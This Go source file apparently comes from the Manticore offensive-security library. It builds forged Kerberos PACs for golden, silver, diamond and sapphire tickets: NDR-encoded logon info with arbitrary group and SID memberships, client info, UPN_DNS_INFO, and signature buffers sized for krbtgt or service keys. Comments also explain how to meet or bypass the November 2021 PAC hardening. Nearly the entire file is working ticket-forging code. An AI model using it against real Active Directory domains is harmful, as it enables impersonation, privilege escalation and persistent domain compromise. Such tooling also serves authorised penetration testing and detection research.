package pac

import (
	"encoding/binary"
	"fmt"
	"time"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
	msdtyp "github.com/TheManticoreProject/Manticore/windows/ms-dtyp"
)

// This file builds (forges) a PAC from scratch: it NDR-encodes a
// KERB_VALIDATION_INFO logon-info buffer, lays out a PAC_CLIENT_INFO buffer, and
// assembles them with empty server/KDC signature buffers ready for Sign. It is
// the counterpart to Parse/VerifyServerSignature and underpins golden/silver
// ticket forging in the parent package.
//
// The logon info is serialized with NDR "type serialization version 1"
// ([MS-RPCE] 2.2.6): a top-level pointer to the structure is marshaled under NDR
// (little-endian) and wrapped in a CommonTypeHeader + PrivateHeaderForConstructed
// Type, padded to an 8-octet boundary. Only the logon-info and client-info
// buffers are emitted here. Diamond/sapphire forging re-uses a legitimately
// issued PAC and round-trips an existing buffer through
// UnmarshalKerbValidationInfo → edit → MarshalKerbValidationInfo (see the parent
// package's diamond_sapphire.go), then re-signs with PAC.Sign.

// filetimeEpochDelta is the number of 100-nanosecond intervals between the
// Windows FILETIME epoch (1601-01-01) and the Unix epoch (1970-01-01).
const filetimeEpochDelta = 116444736000000000

// FILETIME is the [MS-DTYP] 2.3.3 64-bit timestamp as two 32-bit halves, NDR
// marshaled as a structure of two ULONGs (little-endian).
type FILETIME struct {
	LowDateTime  uint32
	HighDateTime uint32
}

// NeverExpireFileTime is the FILETIME value (0x7FFFFFFFFFFFFFFF) used for "never"
// times such as LogoffTime, KickOffTime, and PasswordMustChange.
func NeverExpireFileTime() FILETIME {
	return FILETIME{LowDateTime: 0xFFFFFFFF, HighDateTime: 0x7FFFFFFF}
}

// FileTimeFromTime converts a Go time to a Windows FILETIME. A zero time maps to
// a zero FILETIME.
func FileTimeFromTime(t time.Time) FILETIME {
	if t.IsZero() {
		return FILETIME{}
	}
	ticks := uint64(t.UTC().UnixNano()/100) + filetimeEpochDelta
	return FILETIME{LowDateTime: uint32(ticks), HighDateTime: uint32(ticks >> 32)}
}

// RPC_UNICODE_STRING is the [MS-DTYP] 2.3.10 counted Unicode string. Length and
// MaximumLength are byte counts; Buffer is a unique pointer to a conformant and
// varying array of UTF-16LE code units (no NUL terminator). The NDR array counts
// are derived from Buffer's length, so callers should keep Length ==
// MaximumLength == 2*len(Buffer) (NewUnicodeString does this).
type RPC_UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        []uint16 `ndr:"unique,varying"`
}

// NewUnicodeString builds an RPC_UNICODE_STRING from a Go string, encoding it as
// UTF-16LE with Length and MaximumLength set to its byte length.
func NewUnicodeString(s string) RPC_UNICODE_STRING {
	units := utf16Units(s)
	byteLen := uint16(len(units) * 2)
	return RPC_UNICODE_STRING{Length: byteLen, MaximumLength: byteLen, Buffer: units}
}

// GROUP_MEMBERSHIP is the [MS-PAC] 2.2.2 (RID, attributes) pair naming a group
// the account belongs to in a domain.
type GROUP_MEMBERSHIP struct {
	RelativeId uint32
	Attributes uint32
}

// KERB_SID_AND_ATTRIBUTES is the [MS-PAC] 2.2.1 (SID, attributes) pair used for
// ExtraSids (groups from domains other than the account domain).
type KERB_SID_AND_ATTRIBUTES struct {
	Sid        *msdtyp.RPC_SID `ndr:"unique"`
	Attributes uint32
}

// USER_SESSION_KEY is the 16-byte session key ([MS-PAC] 2.2.3). It is zero for
// [MS-KILE] (Kerberos) authentication.
type USER_SESSION_KEY struct {
	Data [16]byte
}

// KERB_VALIDATION_INFO is the [MS-PAC] 2.5 logon-info structure (ulType
// 0x00000001). It is a subset of NETLOGON_VALIDATION_SAM_INFO4; the NTLM-specific
// members (UserSessionKey, the User* flag bits) are zero under Kerberos. The
// pointer members are [unique]; the size_is arrays are pointers to conformant
// arrays whose counts follow from the paired *Count field / slice length.
type KERB_VALIDATION_INFO struct {
	LogonTime              FILETIME
	LogoffTime             FILETIME
	KickOffTime            FILETIME
	PasswordLastSet        FILETIME
	PasswordCanChange      FILETIME
	PasswordMustChange     FILETIME
	EffectiveName          RPC_UNICODE_STRING
	FullName               RPC_UNICODE_STRING
	LogonScript            RPC_UNICODE_STRING
	ProfilePath            RPC_UNICODE_STRING
	HomeDirectory          RPC_UNICODE_STRING
	HomeDirectoryDrive     RPC_UNICODE_STRING
	LogonCount             uint16
	BadPasswordCount       uint16
	UserId                 uint32
	PrimaryGroupId         uint32
	GroupCount             uint32
	GroupIds               []GROUP_MEMBERSHIP `ndr:"unique,size_is=GroupCount"`
	UserFlags              uint32
	UserSessionKey         USER_SESSION_KEY
	LogonServer            RPC_UNICODE_STRING
	LogonDomainName        RPC_UNICODE_STRING
	LogonDomainId          *msdtyp.RPC_SID `ndr:"unique"`
	Reserved1              [2]uint32
	UserAccountControl     uint32
	SubAuthStatus          uint32
	LastSuccessfulILogon   FILETIME
	LastFailedILogon       FILETIME
	FailedILogonCount      uint32
	Reserved3              uint32
	SidCount               uint32
	ExtraSids              []KERB_SID_AND_ATTRIBUTES `ndr:"unique,size_is=SidCount"`
	ResourceGroupDomainSid *msdtyp.RPC_SID           `ndr:"unique"`
	ResourceGroupCount     uint32
	ResourceGroupIds       []GROUP_MEMBERSHIP `ndr:"unique,size_is=ResourceGroupCount"`
}

// kerbValidationInfoTop wraps the structure in a top-level [unique] pointer so
// NDR emits the leading referent id ([MS-RPCE] type serialization serializes a
// pointer to the constructed type), matching a Windows-issued PAC's logon-info
// buffer.
type kerbValidationInfoTop struct {
	Info *KERB_VALIDATION_INFO `ndr:"unique"`
}

// MarshalKerbValidationInfo NDR-encodes the logon info under type serialization
// version 1 ([MS-RPCE] 2.2.6): the CommonTypeHeader and PrivateHeaderForConstruct
// edType frame the NDR body, which is padded to an 8-octet boundary.
func MarshalKerbValidationInfo(info *KERB_VALIDATION_INFO) ([]byte, error) {
	body, err := ndr.Marshal(&kerbValidationInfoTop{Info: info})
	if err != nil {
		return nil, fmt.Errorf("pac: marshal KERB_VALIDATION_INFO: %w", err)
	}
	return wrapTypeSerialization(body), nil
}

// wrapTypeSerialization prepends the 8-byte CommonTypeHeader and 8-byte
// PrivateHeaderForConstructedType to an NDR body and pads the body to an 8-octet
// boundary. ObjectBufferLength counts the padded body and excludes the two
// headers ([MS-RPCE] 2.2.6.1/2.2.6.2).
func wrapTypeSerialization(body []byte) []byte {
	padded := append([]byte(nil), body...)
	if rem := len(padded) % 8; rem != 0 {
		padded = append(padded, make([]byte, 8-rem)...)
	}
	out := make([]byte, 16+len(padded))
	// CommonTypeHeader: Version=1, Endianness=0x10 (little-endian ints, ASCII
	// chars), CommonHeaderLength=8, Filler=0xCCCCCCCC.
	out[0] = 0x01
	out[1] = 0x10
	binary.LittleEndian.PutUint16(out[2:], 8)
	binary.LittleEndian.PutUint32(out[4:], 0xCCCCCCCC)
	// PrivateHeaderForConstructedType: ObjectBufferLength, Filler=0.
	binary.LittleEndian.PutUint32(out[8:], uint32(len(padded)))
	binary.LittleEndian.PutUint32(out[12:], 0)
	copy(out[16:], padded)
	return out
}

// UnmarshalKerbValidationInfo decodes a type-serialized logon-info buffer (the
// output of MarshalKerbValidationInfo, or a Windows PAC's ulType 0x01 buffer)
// back into a KERB_VALIDATION_INFO. It strips the 16-byte serialization headers
// and NDR-decodes the body.
func UnmarshalKerbValidationInfo(data []byte) (*KERB_VALIDATION_INFO, error) {
	if len(data) < 16 {
		return nil, fmt.Errorf("pac: logon info too short (%d bytes)", len(data))
	}
	var top kerbValidationInfoTop
	if err := ndr.Unmarshal(data[16:], &top); err != nil {
		return nil, fmt.Errorf("pac: unmarshal KERB_VALIDATION_INFO: %w", err)
	}
	if top.Info == nil {
		return nil, fmt.Errorf("pac: logon info has a null top-level pointer")
	}
	return top.Info, nil
}

// MarshalClientInfo lays out a PAC_CLIENT_INFO buffer ([MS-PAC] 2.7): a
// little-endian FILETIME ClientId (the TGT authentication time), a 16-bit
// NameLength in bytes, and the client account name as UTF-16LE. This buffer is
// not NDR-encoded.
func MarshalClientInfo(clientID time.Time, name string) []byte {
	units := utf16Units(name)
	nameBytes := make([]byte, len(units)*2)
	for i, u := range units {
		binary.LittleEndian.PutUint16(nameBytes[i*2:], u)
	}
	ft := FileTimeFromTime(clientID)
	out := make([]byte, 8+2+len(nameBytes))
	binary.LittleEndian.PutUint32(out[0:], ft.LowDateTime)
	binary.LittleEndian.PutUint32(out[4:], ft.HighDateTime)
	binary.LittleEndian.PutUint16(out[8:], uint16(len(nameBytes)))
	copy(out[10:], nameBytes)
	return out
}

// SignatureTypeForEType returns the PAC signature type ([MS-PAC] 2.8) and its
// byte length for a signing key of the given Kerberos encryption type: HMAC-MD5
// for RC4, HMAC-SHA1-96 for the AES enctypes. It reports false for unsupported
// enctypes.
func SignatureTypeForEType(etype int) (sigType uint32, size int, ok bool) {
	switch etype {
	case iana.ETypeRC4HMAC:
		return sigHMACMD5, 16, true
	case iana.ETypeAES128CTSHMACSHA196:
		return sigHMACSHA1128, 12, true
	case iana.ETypeAES256CTSHMACSHA196:
		return sigHMACSHA1256, 12, true
	default:
		return 0, 0, false
	}
}

// ForgeExtras selects the optional buffers Forge adds beyond the logon and
// client info.
type ForgeExtras struct {
	// OldPAC omits PAC_ATTRIBUTES_INFO and PAC_REQUESTOR, producing the PAC
	// layout from before the November 2021 hardening (CVE-2021-42287).
	OldPAC bool
	// UPNDNS, when set, adds a UPN_DNS_INFO buffer with the SAM name and SID
	// extension.
	UPNDNS *UPNDNSInfo
	// ExtendedKDCSignature, when set, adds an empty extended KDC signature
	// buffer (0x13), which a DC with KrbtgtFullPacSignature enforcement requires.
	// The caller fills it with PAC.SignExtendedKDCSignature (KDC/krbtgt key)
	// before PAC.Sign, so the server signature then covers it.
	ExtendedKDCSignature bool
}

// Forge assembles an unsigned PAC from an NDR-encoded logon info and the client
// principal, with empty server (0x06) and KDC (0x07) signature buffers sized for
// signEType. Call Sign(serverKey, kdcKey) on the result to fill the signatures
// and obtain the final marshaled PAC. For a golden ticket both keys are the
// krbtgt key; for a silver ticket both are the service account key.
//
// The PAC carries PAC_ATTRIBUTES_INFO and PAC_REQUESTOR, which DCs enforcing the
// November 2021 PAC hardening require: without them Windows Server 2025 refuses
// the TGT with KDC_ERR_TGT_REVOKED. ForgeWithExtras can omit them or add
// UPN_DNS_INFO.
func Forge(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Time, signEType int) (*PAC, error) {
	return ForgeWithExtras(info, clientName, clientAuthTime, signEType, ForgeExtras{})
}

// ForgeWithExtras is Forge with control over the optional buffers.
func ForgeWithExtras(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Time, signEType int, extras ForgeExtras) (*PAC, error) {
	sigType, sigSize, ok := SignatureTypeForEType(signEType)
	if !ok {
		return nil, fmt.Errorf("pac: cannot forge PAC signatures for etype %d", signEType)
	}
	logonInfo, err := MarshalKerbValidationInfo(info)
	if err != nil {
		return nil, err
	}
	clientInfo := MarshalClientInfo(clientAuthTime, clientName)

	buffers := []Buffer{
		{Type: BufferLogonInfo, Data: logonInfo},
		{Type: BufferClientInfo, Data: clientInfo},
	}
	if extras.UPNDNS != nil {
		upnDNS, err := MarshalUPNDNSInfo(*extras.UPNDNS)
		if err != nil {
			return nil, err
		}
		buffers = append(buffers, Buffer{Type: BufferUPNDNSInfo, Data: upnDNS})
	}
	if !extras.OldPAC {
		userSID := rpcSIDWithRID(info.LogonDomainId, info.UserId)
		if userSID == nil {
			return nil, fmt.Errorf("pac: PAC_REQUESTOR needs the logon info's LogonDomainId")
		}
		requestor, err := userSID.Marshal()
		if err != nil {
			return nil, err
		}
		buffers = append(buffers,
			Buffer{Type: BufferAttributesInfo, Data: MarshalAttributesInfo(PACWasRequested)},
			Buffer{Type: BufferRequestorSID, Data: requestor},
		)
	}
	buffers = append(buffers,
		Buffer{Type: BufferServerChecksum, Data: newSignatureBuffer(sigType, sigSize)},
		Buffer{Type: BufferKDCChecksum, Data: newSignatureBuffer(sigType, sigSize)},
	)
	if extras.ExtendedKDCSignature {
		buffers = append(buffers, Buffer{Type: BufferExtendedKDCChecksum, Data: newSignatureBuffer(sigType, sigSize)})
	}
	return &PAC{Buffers: buffers}, nil
}

// PAC_ATTRIBUTES_INFO flags ([MS-PAC] 2.14).
const (
	// PACWasRequested: the client asked for the PAC (or did not ask not to).
	PACWasRequested uint32 = 0x00000001
	// PACWasGivenImplicitly: the PAC was included without the client asking.
	PACWasGivenImplicitly uint32 = 0x00000002
)

// MarshalAttributesInfo encodes a PAC_ATTRIBUTES_INFO buffer ([MS-PAC] 2.14):
// FlagsLength (in bits, 2) followed by the flags.
func MarshalAttributesInfo(flags uint32) []byte {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint32(b[0:4], 2)
	binary.LittleEndian.PutUint32(b[4:8], flags)
	return b
}

// UPNDNSInfo is the content of a UPN_DNS_INFO buffer ([MS-PAC] 2.10) with the
// SAM name and SID extension (flag S).
type UPNDNSInfo struct {
	UPN           string
	DNSDomainName string
	SamName       string
	SID           *msdtyp.RPC_SID
}

// upnDNSFlagExtended is UPN_DNS_INFO flag S: the SAM name and SID follow.
const upnDNSFlagExtended uint32 = 0x00000002

// MarshalUPNDNSInfo encodes a UPN_DNS_INFO buffer with the SAM name and SID
// extension: the fixed part (UpnLength/Offset, DnsDomainNameLength/Offset,
// Flags, SamNameLength/Offset, SidLength/Offset) followed by the UTF-16LE
// strings and the packed SID, each starting 8-byte aligned from the buffer's
// start, as Windows and impacket lay them out.
func MarshalUPNDNSInfo(u UPNDNSInfo) ([]byte, error) {
	if u.SID == nil {
		return nil, fmt.Errorf("pac: UPN_DNS_INFO needs the account SID")
	}
	sid, err := u.SID.Marshal()
	if err != nil {
		return nil, err
	}
	fields := [][]byte{
		encodeUTF16LE(u.UPN),
		encodeUTF16LE(u.DNSDomainName),
		encodeUTF16LE(u.SamName),
		sid,
	}
	const fixed = 20
	// Every length and offset is a 16-bit field, so the strings and the SID,
	// and the offsets they sit at, must fit. Real principal names never
	// approach this, but a guard keeps a malformed one from truncating.
	total := align8(fixed)
	for _, f := range fields {
		if len(f) > 0xFFFF || total > 0xFFFF {
			return nil, fmt.Errorf("pac: UPN_DNS_INFO field or offset exceeds 16 bits")
		}
		total = align8(total + len(f))
	}
	out := make([]byte, align8(fixed))
	offsets := make([]int, len(fields))
	for i, f := range fields {
		offsets[i] = len(out)
		out = append(out, f...)
		out = append(out, make([]byte, align8(len(out))-len(out))...)
	}
	binary.LittleEndian.PutUint16(out[0:2], uint16(len(fields[0])))
	binary.LittleEndian.PutUint16(out[2:4], uint16(offsets[0]))
	binary.LittleEndian.PutUint16(out[4:6], uint16(len(fields[1])))
	binary.LittleEndian.PutUint16(out[6:8], uint16(offsets[1]))
	binary.LittleEndian.PutUint32(out[8:12], upnDNSFlagExtended)
	binary.LittleEndian.PutUint16(out[12:14], uint16(len(fields[2])))
	binary.LittleEndian.PutUint16(out[14:16], uint16(offsets[2]))
	binary.LittleEndian.PutUint16(out[16:18], uint16(len(fields[3])))
	binary.LittleEndian.PutUint16(out[18:20], uint16(offsets[3]))
	return out, nil
}

// encodeUTF16LE encodes s as UTF-16LE bytes.
func encodeUTF16LE(s string) []byte {
	units := utf16Units(s)
	b := make([]byte, 2*len(units))
	for i, u := range units {
		binary.LittleEndian.PutUint16(b[2*i:], u)
	}
	return b
}

// newSignatureBuffer builds a PAC_SIGNATURE_DATA buffer ([MS-PAC] 2.8): a 4-byte
// SignatureType followed by a zeroed Signature of the given length (Sign fills
// it in place).
func newSignatureBuffer(sigType uint32, size int) []byte {
	b := make([]byte, 4+size)
	binary.LittleEndian.PutUint32(b, sigType)
	return b
}

// DefaultGroupAttributes marks a group as mandatory, enabled by default, and
// enabled (SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED),
// the attribute set Windows assigns to a user's group memberships in the PAC.
const DefaultGroupAttributes uint32 = 0x00000007

// utf16Units encodes a Go string as a slice of UTF-16 code units (native order;
// the NDR encoder writes them little-endian).
func utf16Units(s string) []uint16 {
	var units []uint16
	for _, r := range s {
		if r <= 0xFFFF {
			units = append(units, uint16(r))
			continue
		}
		r -= 0x10000
		units = append(units, 0xD800+uint16(r>>10), 0xDC00+uint16(r&0x3FF))
	}
	return units
}
